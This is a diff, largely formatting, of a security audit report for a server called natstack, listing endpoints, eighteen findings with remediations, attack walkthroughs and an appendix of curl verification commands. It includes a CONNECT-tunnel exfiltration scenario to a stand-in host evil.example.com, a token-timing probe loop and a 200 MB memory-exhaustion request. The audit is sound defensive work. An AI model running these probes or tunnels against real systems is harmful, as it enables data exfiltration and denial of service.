@@ -41,50 +41,51 @@ No findings affect the core TLS-pinning implementation (`src/main/tlsPinning.ts`
 
 ### Gateway (TLS) — `src/server/gateway.ts`
 
-| Method | Path | Handler | Auth |
-|---|---|---|---|
-| GET | `/healthz` | inline | none for basic; admin token via `Authorization: Bearer` gates detailed fields |
-| GET/WS | `/rpc` | `RpcServer.handleGatewayHttpRequest` / `handleGatewayWsConnection` | Bearer (HTTP) or `ws:auth` (WS) — per-caller tokens only; admin tokens are rejected |
-| ANY | `/_w/*` | reverse proxy → workerd | caller bearer at gateway; gateway-scoped bearer to workerd |
-| ANY | `/_r/w/<source>/...` | route lookup → workerd rewrite | route `auth` attr (public / admin-token) |
-| ANY | `/_r/s/<service>/...` | in-proc service handler | route `auth` attr |
-| ANY | `/_git/*` | in-process git handler | caller bearer at gateway, except CORS `OPTIONS` |
-| other | `*` | `PanelHttpServer.handleGatewayRequest` | varies (see below) |
+| Method | Path                  | Handler                                                            | Auth                                                                                |
+| ------ | --------------------- | ------------------------------------------------------------------ | ----------------------------------------------------------------------------------- |
+| GET    | `/healthz`            | inline                                                             | none for basic; admin token via `Authorization: Bearer` gates detailed fields       |
+| GET/WS | `/rpc`                | `RpcServer.handleGatewayHttpRequest` / `handleGatewayWsConnection` | Bearer (HTTP) or `ws:auth` (WS) — per-caller tokens only; admin tokens are rejected |
+| ANY    | `/_w/*`               | reverse proxy → workerd                                            | caller bearer at gateway; gateway-scoped bearer to workerd                          |
+| ANY    | `/_r/w/<source>/...`  | route lookup → workerd rewrite                                     | route `auth` attr (public / admin-token)                                            |
+| ANY    | `/_r/s/<service>/...` | in-proc service handler                                            | route `auth` attr                                                                   |
+| ANY    | `/_git/*`             | in-process git handler                                             | caller bearer at gateway, except CORS `OPTIONS`                                     |
+| other  | `*`                   | `PanelHttpServer.handleGatewayRequest`                             | varies (see below)                                                                  |
 
 Upgrade path mirrors HTTP: `/rpc`, `/_w/`, `/_r/` with WS-enabled routes, and anything else goes to the panel HTTP upgrade handler (CDP bridge).
 
 ### Panel HTTP — `src/server/panelHttpServer.ts`
 
-| Method | Path | Auth |
-|---|---|---|
-| GET | `/__loader.js` | none |
-| GET | `/__transport.js` | none |
-| GET | `/api/panels` | **Bearer (managementToken) IFF configured; otherwise allowed** |
-| GET | `/favicon.ico`, `/favicon.svg` | none |
-| GET | `/{source1}/{source2}/…` | none (panel build dispatch, public by design) |
-| GET | `/` | none (index page listing panels) |
+| Method | Path                           | Auth                                                           |
+| ------ | ------------------------------ | -------------------------------------------------------------- |
+| GET    | `/__loader.js`                 | none                                                           |
+| GET    | `/__transport.js`              | none                                                           |
+| GET    | `/api/panels`                  | **Bearer (managementToken) IFF configured; otherwise allowed** |
+| GET    | `/favicon.ico`, `/favicon.svg` | none                                                           |
+| GET    | `/{source1}/{source2}/…`       | none (panel build dispatch, public by design)                  |
+| GET    | `/`                            | none (index page listing panels)                               |
 
 CORS on `/api/*`: `Access-Control-Allow-Origin: *`, `Allow-Methods: GET, OPTIONS`. No credentials allowed by default — but the `Authorization: Bearer` header is accepted.
 
 ### RPC HTTP — `src/server/rpcServer.ts`
 
-| Method | Path | Auth |
-|---|---|---|
-| POST | `/rpc` | `Authorization: Bearer <token>` — per-caller tokens only; admin tokens are rejected |
+| Method | Path   | Auth                                                                                |
+| ------ | ------ | ----------------------------------------------------------------------------------- |
+| POST   | `/rpc` | `Authorization: Bearer <token>` — per-caller tokens only; admin tokens are rejected |
 
 ### Webhook relay (Cloudflare Worker) — `apps/webhook-relay/src/index.ts`
 
-| Method | Path | Auth |
-|---|---|---|
-| GET | `/health` | none |
-| POST | `/webhook/{instanceId}/{providerId}` | **NONE — returns 200 and drops payload** |
-| GET (upgrade) | `/ws/{…}` | **NONE — accepts any WebSocket** |
+| Method        | Path                                 | Auth                                     |
+| ------------- | ------------------------------------ | ---------------------------------------- |
+| GET           | `/health`                            | none                                     |
+| POST          | `/webhook/{instanceId}/{providerId}` | **NONE — returns 200 and drops payload** |
+| GET (upgrade) | `/ws/{…}`                            | **NONE — accepts any WebSocket**         |
 
 Wrangler config has `[vars] ENVIRONMENT = "production"` — no `[[kv_namespaces]]` or secrets. The relay is a scaffold; it does not actually verify or forward anything.
 
 ### Well-known app — `apps/well-known`
 
 Cloudflare Worker serving a static site bucket. Exposes:
+
 - `/.well-known/apple-app-site-association`
 - `/.well-known/assetlinks.json`
 
@@ -114,6 +115,7 @@ clients must exchange admin authority for a caller token before connecting.
 ### F-02 — CRITICAL-by-omission — Webhook ingestion path does not exist / is unauthenticated
 
 **Files:**
+
 - `apps/webhook-relay/src/index.ts:23–35` — accepts `POST /webhook/{instanceId}/{providerId}` and returns `{ received: true }`, no forwarding, no HMAC check, no KV.
 - `src/server/services/webhookService.ts` — manages subscriptions only; no HTTP handler.
 - `packages/shared/src/webhooks/verifier.ts` — verifier library with **correct** `crypto.timingSafeEqual` usage for GitHub / Slack / Stripe, but never invoked from any ingress path.
@@ -121,12 +123,9 @@ clients must exchange admin authority for a caller token before connecting.
 **Attack:** if an integrator points a provider (GitHub, Stripe, Slack) at the webhook-relay's `POST /webhook/...`, the relay accepts and discards the payload, and never verifies the signature. The actual server has no `/webhook` route at all — `/_r/s/webhooks/...` is not registered in `webhookService.ts` (that service is RPC-only).
 
 **Code snippet (apps/webhook-relay/src/index.ts:23–35):**
+
 ```ts
-if (
-  request.method === "POST" &&
-  segments.length === 3 &&
-  segments[0] === "webhook"
-) {
+if (request.method === "POST" && segments.length === 3 && segments[0] === "webhook") {
   const [, instanceId, providerId] = segments;
   void env;
   void instanceId;
@@ -136,6 +135,7 @@ if (
 ```
 
 **Remediation:**
+
 1. Wire `WebhookVerifierRegistry` into a server-side route (e.g., service-route `/_r/s/webhooks/{providerId}` with `auth: "public"` so providers can reach it). Read raw body, look up subscription+secret by `providerId`+`subscriptionId`, call the verifier, then either fan-out via `eventService` or forward to a worker.
 2. Flesh out the Cloudflare relay: require `Authorization: Bearer <relay-token>` (set via `wrangler secret put RELAY_TOKEN`, not `[vars]`), persist seen delivery IDs in KV for idempotency, and forward only after HMAC passes.
 3. Reject requests older than the provider's replay window (Slack: 5 min; Stripe: 5 min default) using `Date.now() - timestampSec*1000`.
@@ -149,6 +149,7 @@ if (
 `slackSignatureV0` and `stripeSignature` extract `timestamp` but never compare it to `Date.now()`. A leaked payload-plus-signature pair can be replayed indefinitely.
 
 **Code snippet:**
+
 ```ts
 export const slackSignatureV0: WebhookVerifier = (payload, headers, secret) => {
   const signature = getHeader(headers, "x-slack-signature");
@@ -172,6 +173,7 @@ export const slackSignatureV0: WebhookVerifier = (payload, headers, secret) => {
 `handleConnect` only checks that `WORKER_ID_HEADER` and `PROXY_AUTH_HEADER` are present. It does not route through `routeProvider`, `authorizeRequest`, rate limiter, or circuit breaker. Any worker that the proxy trusts to set those two headers can open an arbitrary TLS tunnel (e.g., to `evil.example.com:443`).
 
 **Code snippet (egressProxy.ts:274–320):**
+
 ```ts
 private async handleConnect(req: IncomingMessage, socket: Duplex, _head: Buffer): Promise<void> {
   const startedAt = Date.now();
@@ -187,10 +189,12 @@ private async handleConnect(req: IncomingMessage, socket: Duplex, _head: Buffer)
 ```
 
 **Attack scenarios:**
+
 - Untrusted worker exfiltrates data to a non-provider domain via HTTPS — the plaintext never touches the proxy so capability lists can't apply; provider routing on CONNECT is inherently limited to hostname, but no such routing is even attempted.
 - Rate-limits bypass — CONNECT tunnels don't consume any bucket.
 
 **Remediation:**
+
 1. Perform `routeProvider` on the CONNECT authority (host+port → provider manifest's `apiBase` host match).
 2. Require a consent grant for the matched provider; reject if none.
 3. Apply rate limiting and circuit breaker on the CONNECT call.
@@ -248,9 +252,11 @@ passes caller identity to the in-process handler.
 **File:** `src/server/services/egressProxy.ts:254–270`
 
 The audit entry serialized to `~/.config/natstack/logs/credentials-audit-YYYY-MM-DD.jsonl` carries:
+
 ```ts
 url: targetUrl?.toString() ?? (req.url ?? ""),
 ```
+
 Many OAuth and API flows put bearer tokens in query strings (`?api_key=…`, `?access_token=…`, legacy providers). The audit log is not encrypted and is stored in the user's home directory with default permissions.
 
 **Attack:** local user-level compromise (not root) → read logs → extract API keys.
@@ -264,11 +270,12 @@ Many OAuth and API flows put bearer tokens in query strings (`?api_key=…`, `?a
 **File:** `packages/shared/src/constants.ts:32–48`
 
 ```ts
-"script-src 'self' 'unsafe-inline' 'unsafe-eval' https: http://localhost:* http://127.0.0.1:*",
-"connect-src 'self' ws://127.0.0.1:* wss://127.0.0.1:* http://127.0.0.1:* https://127.0.0.1:* ws://localhost:* wss://localhost:* http://localhost:* https://localhost:* ws: wss: https:"
+("script-src 'self' 'unsafe-inline' 'unsafe-eval' https: http://localhost:* http://127.0.0.1:*",
+  "connect-src 'self' ws://127.0.0.1:* wss://127.0.0.1:* http://127.0.0.1:* https://127.0.0.1:* ws://localhost:* wss://localhost:* http://localhost:* https://localhost:* ws: wss: https:");
 ```
 
 `script-src 'unsafe-inline' 'unsafe-eval' https:` + `connect-src https:` means any stored XSS in a panel can:
+
 1. Load and execute code from any `https://` origin (no SRI).
 2. Make WS/HTTPS connections to any host to exfiltrate local data (the panel also holds a per-panel token with `/rpc` reach).
 
@@ -288,7 +295,7 @@ const MAX_BODY_SIZE = 200 * 1024 * 1024; // 200MB
 
 Any authenticated caller (admin OR per-caller token) can PUT 200 MB of bytes per request — buffered entirely in memory (`chunks` array) — before JSON.parse. A handful of concurrent clients exhausts memory.
 
-**Remediation:** lower default to 8–16 MB (typical RPC payloads are < 1 MB), allow opt-in streaming for image/file services that use binary envelopes, and cap *total in-flight bytes* across all connected clients (not just per-request).
+**Remediation:** lower default to 8–16 MB (typical RPC payloads are < 1 MB), allow opt-in streaming for image/file services that use binary envelopes, and cap _total in-flight bytes_ across all connected clients (not just per-request).
 
 ---
 
@@ -303,6 +310,7 @@ const subdomain = extractSubdomain(req.headers.host ?? "", this.externalHost);
 ```
 
 The Host header is attacker-controlled. `extractSubdomain` regexes against `externalHost`, which is safe against absurd hosts (returns null). But:
+
 - If a future change logs `url.toString()`, an attacker-controlled host ends up in logs (log-spoofing / phishing link injection).
 - If a future reverse proxy cares about `Host`, mismatches can route requests to unexpected panel subdomains.
 
@@ -336,7 +344,10 @@ The token-gated branch leaks `version: "0.1.0"`, `uptimeMs`, and `tokenSource`. 
 
 ```ts
 function escapeHtml(s: string): string {
-  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+  return s
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
     .replace(/"/g, "&quot;");
 }
 ```
@@ -353,7 +364,7 @@ No `'` → `&#39;`. All current call sites use the output inside `"..."` attribu
 
 `redactTokenIn(err.message, adminToken)` is invoked with the token as the redaction key. If `redactTokenIn` does a naive `indexOf` scan, it works — but if the error is not a string or contains the token in a slightly re-encoded form, redaction silently fails.
 
-This is only a concern on the *client* side (console-log), not the server, but any user shipping their logs to a crash-reporter would leak the token. Out of scope for this audit but noted.
+This is only a concern on the _client_ side (console-log), not the server, but any user shipping their logs to a crash-reporter would leak the token. Out of scope for this audit but noted.
 
 ---
 
@@ -412,6 +423,7 @@ Unhandled service errors get a 200 with `{ error }`. Middleware that inspects HT
 ### F-18 — INFO — No Strict-Transport-Security / X-Content-Type-Options / Referrer-Policy
 
 None of the serves (gateway, panelHttp, rpc) emits:
+
 - `Strict-Transport-Security` (relevant when TLS is on)
 - `X-Content-Type-Options: nosniff`
 - `Referrer-Policy: no-referrer` or stricter
@@ -420,6 +432,7 @@ None of the serves (gateway, panelHttp, rpc) emits:
 On the HTML-producing paths (panelHttpServer), `X-Frame-Options: DENY` or `frame-ancestors` CSP directive is also absent — panels can be iframed by any origin.
 
 **Remediation:** add a single `writeSecurityHeaders(res)` helper and call it from every HTML/JSON response path. Baseline:
+
 ```ts
 res.setHeader("X-Content-Type-Options", "nosniff");
 res.setHeader("Referrer-Policy", "no-referrer");
@@ -428,6 +441,7 @@ res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
 // For HTML:
 res.setHeader("X-Frame-Options", "DENY");
 ```
+
 (`X-Frame-Options` should be kept even though the CSP injects `frame-ancestors` — belt and braces for old browsers.)
 
 ---
@@ -446,6 +460,7 @@ res.setHeader("X-Frame-Options", "DENY");
 ## Attack Walkthroughs
 
 ### Walkthrough 1 — remediated historical timing attack on admin token
+
 1. Attacker knows the server URL (`https://server.example.com:8080`).
 2. Historically, the attacker could repeatedly request `/healthz?token=<candidate>` and measure branch timing.
 3. Current code no longer accepts query-token admin auth, uses constant-time admin comparisons, and rejects admin tokens on `/rpc`.
@@ -453,6 +468,7 @@ res.setHeader("X-Frame-Options", "DENY");
 **Mitigated by F-01 remediation.**
 
 ### Walkthrough 2 — webhook-relay passthrough
+
 1. Attacker gets a victim to configure their GitHub repo to POST to `https://victim-relay.workers.dev/webhook/i/gh`.
 2. Every delivery returns `{ received: true }` and is black-holed.
 3. Legitimate automation breaks silently (DoS by integration) AND attacker has confirmed the relay is unowned — they set up their own relay at the same path, host it on a lookalike domain, and harvest real webhook payloads (which include the repository data the hook subscribed to).
@@ -460,6 +476,7 @@ res.setHeader("X-Frame-Options", "DENY");
 **Mitigated by F-02 remediation.**
 
 ### Walkthrough 3 — CONNECT-tunnel exfiltration
+
 1. Untrusted worker is installed (perhaps from a plugin marketplace).
 2. Worker sets `HTTP_PROXY=http://127.0.0.1:<egressPort>` and `x-natstack-worker-id` + `x-natstack-proxy-auth` headers.
 3. Worker issues `CONNECT evil.example.com:443`.
@@ -471,12 +488,12 @@ res.setHeader("X-Frame-Options", "DENY");
 
 ## Remediation Priority Matrix
 
-| Priority | Finding | Work |
-|---|---|---|
-| P0 (blocker for public exposure) | F-01 (timing), F-02 (webhook route), F-04 (CONNECT) | 1 day |
-| P1 | F-03 (replay), F-05 (mgmt auth default-deny), F-07 (audit redaction) | 1 day |
-| P2 | F-06 (gateway-level auth), F-08 (panel CSP), F-09 (body size) | 2–3 days |
-| P3 | F-10 — F-18 (hardening) | 1 day |
+| Priority                         | Finding                                                              | Work     |
+| -------------------------------- | -------------------------------------------------------------------- | -------- |
+| P0 (blocker for public exposure) | F-01 (timing), F-02 (webhook route), F-04 (CONNECT)                  | 1 day    |
+| P1                               | F-03 (replay), F-05 (mgmt auth default-deny), F-07 (audit redaction) | 1 day    |
+| P2                               | F-06 (gateway-level auth), F-08 (panel CSP), F-09 (body size)        | 2–3 days |
+| P3                               | F-10 — F-18 (hardening)                                              | 1 day    |
 
 ---
 
@@ -487,7 +504,7 @@ res.setHeader("X-Frame-Options", "DENY");
 - `src/server/rpcServer.ts`
 - `src/server/panelHttpServer.ts`
 - `src/server/routeRegistry.ts`
-- `src/server/rpcServiceWithRoutes.ts`
+- `src/server/serviceWithHttpRoutes.ts`
 - `src/server/services/webhookService.ts`
 - `src/server/services/pushService.ts`
 - `src/server/services/imageService.ts` (+ `imageService.test.ts`)
@@ -519,15 +536,18 @@ res.setHeader("X-Frame-Options", "DENY");
 ## Appendix B — Quick test commands to verify findings
 
 F-01 (timing, historical):
+
 ```sh
 for i in $(seq 1 1000); do
   curl -s -w "%{time_total}\n" -o /dev/null \
     "https://SERVER/healthz?token=$(head -c 64 /dev/urandom | base64 | head -c 32)"
 done | sort -n
 ```
+
 This legacy query-token probe should now return only basic health data; it should not unlock detailed health output.
 
 F-02 (webhook stub):
+
 ```sh
 curl -X POST https://RELAY.workers.dev/webhook/abc/github \
   -H "X-Hub-Signature-256: sha256=bogus" \
@@ -536,6 +556,7 @@ curl -X POST https://RELAY.workers.dev/webhook/abc/github \
 ```
 
 F-04 (CONNECT bypass):
+
 ```sh
 curl -x http://127.0.0.1:EGRESS_PORT \
   -H "x-natstack-worker-id: any" \
@@ -545,6 +566,7 @@ curl -x http://127.0.0.1:EGRESS_PORT \
 ```
 
 F-09 (body size):
+
 ```sh
 head -c 200000000 /dev/urandom | curl -X POST \
   -H "Authorization: Bearer $TOKEN" \
